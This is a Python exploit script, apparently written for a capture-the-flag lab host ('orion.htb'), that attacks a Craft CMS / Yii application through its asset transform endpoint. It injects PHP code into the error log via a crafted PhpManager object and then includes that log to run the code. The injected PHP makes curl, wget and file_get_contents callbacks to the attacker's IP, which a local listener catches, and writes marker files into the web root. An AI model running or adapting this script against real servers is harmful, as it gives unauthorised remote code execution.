import socket, threading, time, requests, re, random, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}
MY_IP = '10.10.15.184'

# Phase 1: Set up network listener
results = {'callbacks': []}

def listen_for(port, timeout, label):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    s.settimeout(timeout)
    try:
        conn, addr = s.accept()
        data = conn.recv(1024)
        msg = f'[+] Callback on {label} from {addr}: {data}'
        print(msg, flush=True)
        results['callbacks'].append(msg)
        try:
            conn.send(b'HTTP/1.0 200 OK\r\n\r\n')
        except Exception:
            pass
        conn.close()
        return True
    except socket.timeout:
        print(f'  [-] No callback on {label}', flush=True)
        return False
    finally:
        s.close()

for port, lbl in [(9991, 'fgc'), (9992, 'exec'), (9993, 'wget')]:
    t = threading.Thread(target=listen_for, args=(port, 40, lbl), daemon=True)
    t.start()
time.sleep(0.5)

# Phase 2: Build payload
uid = random.randint(10000, 99999)
print(f'[UID: {uid}]', flush=True)

php = '<?php '
php += '@file_get_contents("http://' + MY_IP + ':9991/fgc' + str(uid) + '");'
php += '@exec("curl -s http://' + MY_IP + ':9992/exec' + str(uid) + ' >/dev/null 2>&1 &");'
php += '@exec("wget -q -O /dev/null http://' + MY_IP + ':9993/wget' + str(uid) + ' 2>/dev/null &");'
php += '@file_put_contents("/var/www/html/craft/web/M' + str(uid) + '.txt", "OK");'
php += '@file_put_contents("/tmp/ORION' + str(uid) + '", "OK");'
php += 'sleep(3);'
php += '?>'

inject_path = '/nonexistent_dir/' + php
print(f'Inject len: {len(inject_path)}', flush=True)

# Phase 3: Send requests with proper error handling
def safe_req(body, label=''):
    try:
        s = requests.Session()
        r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=20)
        m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
        if not m:
            print(f'  [{label}] No CSRF!', flush=True)
            return None, 0
        csrf = m.group(1)
        headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
        t0 = time.time()
        r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
                   json=body, headers=headers, timeout=20)
        elapsed = time.time() - t0
        print(f'  [{label}] {r2.status_code} ({elapsed:.2f}s)', flush=True)
        return r2, elapsed
    except Exception as e:
        print(f'  [{label}] ERROR: {type(e).__name__}: {e}', flush=True)
        return None, 0

body1 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': inject_path
        }
    }
}
body2 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': '/var/www/html/craft/storage/logs/phperrors.log'
        }
    }
}

print('Step 1: Inject payload via require() error...', flush=True)
r1, t1 = safe_req(body1, 'Step1')
sys.stdout.flush()

time.sleep(3)

print('Step 2: Include error_log (PHP code should execute)...', flush=True)
r2, t2 = safe_req(body2, 'Step2')
sys.stdout.flush()

time.sleep(1)

print('Control: Include error_log again (baseline)...', flush=True)
r2b, t2b = safe_req(body2, 'Ctrl')

# Phase 4: Wait and check results
print(f'\nWaiting 20s for callbacks...', flush=True)
time.sleep(20)

print(f'Checking web marker M{uid}.txt...', flush=True)
try:
    r3 = requests.get(f'{HOST}/M{uid}.txt', headers=HEADERS, timeout=10)
    print(f'  Status: {r3.status_code}', flush=True)
    if r3.status_code == 200:
        print(f'  [+] FOUND! Content: {r3.text}', flush=True)
except Exception as e:
    print(f'  Error: {e}', flush=True)

print(f'\nCallback results: {results["callbacks"]}', flush=True)
print('Done.', flush=True)
